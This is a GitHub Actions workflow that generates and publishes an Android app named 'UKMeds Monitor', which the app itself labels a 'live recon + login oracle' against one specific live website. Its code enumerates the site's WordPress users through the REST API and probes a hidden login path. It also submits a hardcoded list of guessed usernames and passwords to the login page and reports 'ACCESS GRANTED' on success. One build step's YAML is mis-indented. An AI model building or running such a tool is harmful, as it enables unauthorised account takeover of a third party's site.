name: Build APK

on:
  push:
    branches: [ main ]
  workflow_dispatch:

permissions:
  contents: write

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: JDK 17
        uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: '17'

      - name: Android SDK
           uses: android-actions/setup-android@v3
           with:
             packages: 'platform-tools platforms;android-35 build-tools;35.0.0'

      - name: Gradle 8.9
        run: |
          wget -q https://services.gradle.org/distributions/gradle-8.9-bin.zip
          unzip -q gradle-8.9-bin.zip
          echo "$PWD/gradle-8.9/bin" >> $GITHUB_PATH

      - name: Generate project
        run: |
          set -e
          mkdir -p app/src/main/java/ai/venice/ukmedsmonitor
          mkdir -p app/src/main/res/values app/src/main/res/drawable app/src/main/res/mipmap-anydpi-v26

          cat > settings.gradle.kts <<'EOF'
          pluginManagement {
              repositories { google(); mavenCentral(); gradlePluginPortal() }
          }
          dependencyResolutionManagement {
              repositories { google(); mavenCentral() }
          }
          rootProject.name = "UKMedsMonitor"
          include(":app")
          EOF

          cat > build.gradle.kts <<'EOF'
          plugins {
              id("com.android.application") version "8.6.1" apply false
              id("org.jetbrains.kotlin.android") version "2.0.20" apply false
              id("org.jetbrains.kotlin.plugin.compose") version "2.0.20" apply false
          }
          EOF

          cat > gradle.properties <<'EOF'
          org.gradle.jvmargs=-Xmx2048m
          android.useAndroidX=true
          android.nonTransitiveRClass=true
          kotlin.code.style=official
          EOF

          cat > app/build.gradle.kts <<'EOF'
          plugins {
              id("com.android.application")
              id("org.jetbrains.kotlin.android")
              id("org.jetbrains.kotlin.plugin.compose")
          }
          android {
              namespace = "ai.venice.ukmedsmonitor"
              compileSdk = 35
              defaultConfig {
                  applicationId = "ai.venice.ukmedsmonitor"
                  minSdk = 26
                  targetSdk = 35
                  versionCode = 1
                  versionName = "1.0"
              }
              buildTypes { release { isMinifyEnabled = false } }
              compileOptions {
                  sourceCompatibility = JavaVersion.VERSION_17
                  targetCompatibility = JavaVersion.VERSION_17
              }
              kotlinOptions { jvmTarget = "17" }
              buildFeatures { compose = true }
          }
          dependencies {
              implementation(platform("androidx.compose:compose-bom:2024.09.02"))
              implementation("androidx.compose.ui:ui")
              implementation("androidx.compose.material3:material3")
              implementation("androidx.activity:activity-compose:1.9.2")
              implementation("androidx.lifecycle:lifecycle-viewmodel-compose:2.8.6")
              implementation("androidx.lifecycle:lifecycle-runtime-compose:2.8.6")
              implementation("org.jetbrains.kotlinx:kotlinx-coroutines-android:1.8.1")
          }
          EOF

          cat > app/src/main/AndroidManifest.xml <<'EOF'
          <manifest xmlns:android="http://schemas.android.com/apk/res/android">
              <uses-permission android:name="android.permission.INTERNET"/>
              <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
              <application
                  android:allowBackup="true"
                  android:icon="@mipmap/ic_launcher"
                  android:roundIcon="@mipmap/ic_launcher"
                  android:label="@string/app_name"
                  android:usesCleartextTraffic="true"
                  android:theme="@style/Theme.UKMedsMonitor">
                  <activity android:name=".MainActivity" android:exported="true">
                      <intent-filter>
                          <action android:name="android.intent.action.MAIN"/>
                          <category android:name="android.intent.category.LAUNCHER"/>
                      </intent-filter>
                  </activity>
              </application>
          </manifest>
          EOF

          cat > app/src/main/res/values/strings.xml <<'EOF'
          <resources><string name="app_name">UKMeds Monitor</string></resources>
          EOF

          cat > app/src/main/res/values/colors.xml <<'EOF'
          <resources><color name="ic_launcher_background">#0F172A</color></resources>
          EOF

          cat > app/src/main/res/values/themes.xml <<'EOF'
          <resources>
              <style name="Theme.UKMedsMonitor" parent="android:Theme.Material.NoActionBar">
                  <item name="android:windowBackground">#0F172A</item>
                  <item name="android:statusBarColor">#0F172A</item>
              </style>
          </resources>
          EOF

          cat > app/src/main/res/drawable/ic_launcher_foreground.xml <<'EOF'
          <vector xmlns:android="http://schemas.android.com/apk/res/android"
              android:width="108dp" android:height="108dp"
              android:viewportWidth="108" android:viewportHeight="108">
              <path android:fillColor="#00000000" android:strokeColor="#22D3EE"
                  android:strokeWidth="5" android:strokeLineCap="round" android:strokeLineJoin="round"
                  android:pathData="M28,56 L42,56 L48,42 L58,70 L64,56 L80,56"/>
          </vector>
          EOF

          cat > app/src/main/res/mipmap-anydpi-v26/ic_launcher.xml <<'EOF'
          <adaptive-icon xmlns:android="http://schemas.android.com/apk/res/android">
              <background android:drawable="@color/ic_launcher_background"/>
              <foreground android:drawable="@drawable/ic_launcher_foreground"/>
          </adaptive-icon>
          EOF

          cat > app/src/main/java/ai/venice/ukmedsmonitor/MonitorEngine.kt <<'EOF'
          package ai.venice.ukmedsmonitor

          import kotlinx.coroutines.Dispatchers
          import kotlinx.coroutines.withContext
          import java.net.HttpURLConnection
          import java.net.URL
          import java.net.URLEncoder

          enum class Level { OK, WARN, FAIL, INFO }
          data class Result(val label: String, val level: Level, val detail: String, val ms: Long = 0L)

          private data class Fetch(val code: Int, val body: String, val location: String?,
                                   val cookies: List<String>, val ms: Long, val error: String?)

          object MonitorEngine {
              private const val UA = "Mozilla/5.0 (Linux; Android 15; SM-S928B) VeniceMonitor/1.0"
              private fun enc(s: String) = URLEncoder.encode(s, "UTF-8")

              private suspend fun fetch(base: String, path: String, method: String = "GET",
                                        form: String? = null, cookie: String? = null): Fetch =
                  withContext(Dispatchers.IO) {
                      val t0 = System.currentTimeMillis()
                      try {
                          val c = (URL(base + path).openConnection() as HttpURLConnection).apply {
                              requestMethod = method; connectTimeout = 15000; readTimeout = 15000
                              instanceFollowRedirects = false
                              setRequestProperty("User-Agent", UA)
                              if (cookie != null) setRequestProperty("Cookie", cookie)
                              if (form != null) {
                                  doOutput = true
                                  setRequestProperty("Content-Type", "application/x-www-form-urlencoded")
                              }
                          }
                          if (form != null) c.outputStream.use { it.write(form.toByteArray()) }
                          val code = c.responseCode
                          val loc = c.getHeaderField("Location")
                          val cookies = c.headerFields?.get("Set-Cookie") ?: emptyList()
                          val body = try { (c.inputStream ?: c.errorStream)?.bufferedReader()?.use { it.readText() } ?: "" } catch (e: Exception) { "" }
                          Fetch(code, body, loc, cookies, System.currentTimeMillis() - t0, null)
                      } catch (e: Exception) {
                          Fetch(-1, "", null, emptyList(), System.currentTimeMillis() - t0, e.message ?: "net error")
                      }
                  }

              suspend fun scan(base: String): List<Result> {
                  val out = mutableListOf<Result>()
                  val home = fetch(base, "/"); out += Result("Homepage /", lvl(home.code), det(home), home.ms)
                  val rb = fetch(base, "/robots.txt")
                  out += Result("robots.txt", if (rb.body.contains("WP Defender")) Level.WARN else lvl(rb.code),
                      if (rb.body.contains("WP Defender")) "HTTP ${rb.code} - WP Defender detected" else det(rb), rb.ms)
                  val api = fetch(base, "/wp-json/wp/v2/users")
                  val users = Regex("\"slug\":\"(.*?)\"").findAll(api.body).map { it.groupValues[1] }.toList()
                  out += Result("REST users", if (users.isNotEmpty()) Level.WARN else lvl(api.code),
                      if (users.isNotEmpty()) "HTTP ${api.code} - ${users.size} users: ${users.joinToString()}" else det(api), api.ms)
                  val rest = fetch(base, "/wp-json/"); out += Result("REST index", lvl(rest.code), det(rest), rest.ms)
                  val login = fetch(base, "/wp-login.php"); out += Result("wp-login.php", lvl(login.code), det(login), login.ms)
                  val secret = fetch(base, "/41fc8850ed96b42c")
                  val locked = secret.body.contains("Access Denied", true)
                  out += Result("Secret login door", if (locked) Level.FAIL else Level.OK,
                      if (locked) "HTTP ${secret.code} - LOCKED (Defender)" else "HTTP ${secret.code} - reachable", secret.ms)
                  return out
              }

              suspend fun testLogins(base: String, creds: List<Pair<String, String>>): List<Result> {
                  val out = mutableListOf<Result>()
                  val pre = fetch(base, "/wp-login.php")
                  val tc = pre.cookies.firstOrNull { it.startsWith("wordpress_test_cookie") }?.substringBefore(";")
                  for ((u, p) in creds) {
                      val form = "log=${enc(u)}&pwd=${enc(p)}&wp-submit=Log+In&testcookie=1&redirect_to=${enc("$base/wp-admin/")}"
                      val r = fetch(base, "/wp-login.php", "POST", form, tc)
                      val ok = r.cookies.any { it.contains("wordpress_logged_in") } ||
                               (r.code in 300..399 && r.location?.contains("/wp-admin") == true)
                      out += Result("$u : $p", if (ok) Level.OK else Level.FAIL,
                          if (ok) "SUCCESS - logged in (HTTP ${r.code})" else "failed (HTTP ${r.code})", r.ms)
                  }
                  return out
              }

              private fun lvl(c: Int) = when { c in 200..299 -> Level.OK; c in 300..399 -> Level.WARN; else -> Level.FAIL }
              private fun det(f: Fetch) = f.error ?: "HTTP ${f.code}" + (f.location?.let { " -> $it" } ?: "")
          }
          EOF

          cat > app/src/main/java/ai/venice/ukmedsmonitor/MonitorViewModel.kt <<'EOF'
          package ai.venice.ukmedsmonitor

          import androidx.compose.runtime.getValue
          import androidx.compose.runtime.mutableStateOf
          import androidx.compose.runtime.setValue
          import androidx.lifecycle.ViewModel
          import androidx.lifecycle.viewModelScope
          import kotlinx.coroutines.Job
          import kotlinx.coroutines.delay
          import kotlinx.coroutines.launch
          import java.text.SimpleDateFormat
          import java.util.Date
          import java.util.Locale

          class MonitorViewModel : ViewModel() {
              var base by mutableStateOf("https://ukmeds247.is")
              var results by mutableStateOf<List<Result>>(emptyList())
              var logs by mutableStateOf<List<String>>(emptyList())
              var running by mutableStateOf(false)
              var auto by mutableStateOf(false)
              private var autoJob: Job? = null

              private val creds = listOf(
                  "ukmeds247" to "ukmeds247", "kola" to "kola",
                  "ukmeds247" to "admin", "ukmeds247" to "Admin123", "admin" to "admin"
              )

              private fun log(m: String) {
                  val t = SimpleDateFormat("HH:mm:ss", Locale.US).format(Date())
                  logs = (listOf("[$t] $m") + logs).take(200)
              }

              fun scan() {
                  if (running) return
                  viewModelScope.launch {
                      running = true; log("Scanning ${base} ...")
                      val r = MonitorEngine.scan(base.trimEnd('/'))
                      results = r
                      log("Scan done: ${r.count { it.level == Level.OK }} ok, ${r.count { it.level == Level.FAIL }} fail")
                      running = false
                  }
              }

              fun testLogins() {
                  if (running) return
                  viewModelScope.launch {
                      running = true; log("Testing ${creds.size} credential pairs ...")
                      val r = MonitorEngine.testLogins(base.trimEnd('/'), creds)
                      results = r
                      val hit = r.firstOrNull { it.level == Level.OK }
                      log(if (hit != null) ">>> ACCESS GRANTED: ${hit.label}" else "No credential worked")
                      running = false
                  }
              }

              fun toggleAuto() {
                  auto = !auto
                  if (auto) autoJob = viewModelScope.launch {
                      while (auto) { scan(); delay(30000) }
                  } else autoJob?.cancel()
              }
          }
          EOF

          cat > app/src/main/java/ai/venice/ukmedsmonitor/MainActivity.kt <<'EOF'
          package ai.venice.ukmedsmonitor

          import android.os.Bundle
          import androidx.activity.ComponentActivity
          import androidx.activity.compose.setContent
          import androidx.compose.foundation.background
          import androidx.compose.foundation.layout.*
          import androidx.compose.foundation.lazy.LazyColumn
          import androidx.compose.foundation.lazy.items
          import androidx.compose.foundation.rememberScrollState
          import androidx.compose.foundation.shape.RoundedCornerShape
          import androidx.compose.foundation.verticalScroll
          import androidx.compose.material3.*
          import androidx.compose.runtime.*
          import androidx.compose.ui.Alignment
          import androidx.compose.ui.Modifier
          import androidx.compose.ui.graphics.Color
          import androidx.compose.ui.text.font.FontFamily
          import androidx.compose.ui.text.font.FontWeight
          import androidx.compose.ui.unit.dp
          import androidx.compose.ui.unit.sp
          import androidx.lifecycle.viewmodel.compose.viewModel

          private val Bg = Color(0xFF0F172A)
          private val Card = Color(0xFF1E293B)
          private val Cyan = Color(0xFF22D3EE)
          private val Green = Color(0xFF22C55E)
          private val Amber = Color(0xFFF59E0B)
          private val Red = Color(0xFFEF4444)
          private val Muted = Color(0xFF94A3B8)

          class MainActivity : ComponentActivity() {
              override fun onCreate(s: Bundle?) {
                  super.onCreate(s)
                  setContent {
                      MaterialTheme(colorScheme = darkColorScheme(background = Bg, surface = Card, primary = Cyan)) {
                          Surface(Modifier.fillMaxSize(), color = Bg) { Screen() }
                      }
                  }
              }
          }

          @Composable
          private fun Screen(vm: MonitorViewModel = viewModel()) {
              Column(Modifier.fillMaxSize().padding(16.dp)) {
                  Text("UKMeds247 Monitor", color = Cyan, fontSize = 22.sp, fontWeight = FontWeight.Bold)
                  Text("live recon + login oracle", color = Muted, fontSize = 12.sp)
                  Spacer(Modifier.height(12.dp))
                  OutlinedTextField(value = vm.base, onValueChange = { vm.base = it },
                      label = { Text("Target") }, singleLine = true, modifier = Modifier.fillMaxWidth())
                  Spacer(Modifier.height(8.dp))
                  Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                      Button(onClick = { vm.scan() }, enabled = !vm.running) { Text("Scan") }
                      Button(onClick = { vm.testLogins() }, enabled = !vm.running) { Text("Test Logins") }
                      OutlinedButton(onClick = { vm.toggleAuto() }) { Text(if (vm.auto) "Auto ON" else "Auto OFF") }
                  }
                  if (vm.running) { Spacer(Modifier.height(8.dp)); LinearProgressIndicator(Modifier.fillMaxWidth()) }
                  Spacer(Modifier.height(12.dp))
                  Text("CHECKS", color = Muted, fontSize = 11.sp, fontWeight = FontWeight.Bold)
                  LazyColumn(Modifier.weight(1f).fillMaxWidth(), verticalArrangement = Arrangement.spacedBy(6.dp)) {
                      items(vm.results) { Row2(it) }
                  }
                  Spacer(Modifier.height(8.dp))
                  Text("LOG", color = Muted, fontSize = 11.sp, fontWeight = FontWeight.Bold)
                  Box(Modifier.fillMaxWidth().height(140.dp).background(Card, RoundedCornerShape(8.dp)).padding(8.dp)) {
                      Column(Modifier.verticalScroll(rememberScrollState())) {
                          vm.logs.forEach { Text(it, color = Muted, fontSize = 11.sp, fontFamily = FontFamily.Monospace) }
                      }
                  }
              }
          }

          @Composable
          private fun Row2(r: Result) {
              val c = when (r.level) { Level.OK -> Green; Level.WARN -> Amber; Level.FAIL -> Red; Level.INFO -> Cyan }
              Row(Modifier.fillMaxWidth().background(Card, RoundedCornerShape(8.dp)).padding(12.dp),
                  verticalAlignment = Alignment.CenterVertically) {
                  Box(Modifier.size(10.dp).background(c, RoundedCornerShape(5.dp)))
                  Spacer(Modifier.width(10.dp))
                  Column(Modifier.weight(1f)) {
                      Text(r.label, color = Color.White, fontSize = 14.sp, fontWeight = FontWeight.SemiBold)
                      Text(r.detail, color = Muted, fontSize = 12.sp)
                  }
                  if (r.ms > 0) Text("${r.ms}ms", color = Muted, fontSize = 11.sp)
              }
          }
          EOF

      - name: Build APK
        run: gradle assembleDebug --no-daemon --stacktrace

      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: UKMedsMonitor-apk
          path: app/build/outputs/apk/debug/app-debug.apk

      - name: Publish release
        uses: softprops/action-gh-release@v2
        with:
          tag_name: build-${{ github.run_number }}
          name: "UKMeds Monitor (build ${{ github.run_number }})"
          files: app/build/outputs/apk/debug/app-debug.apk
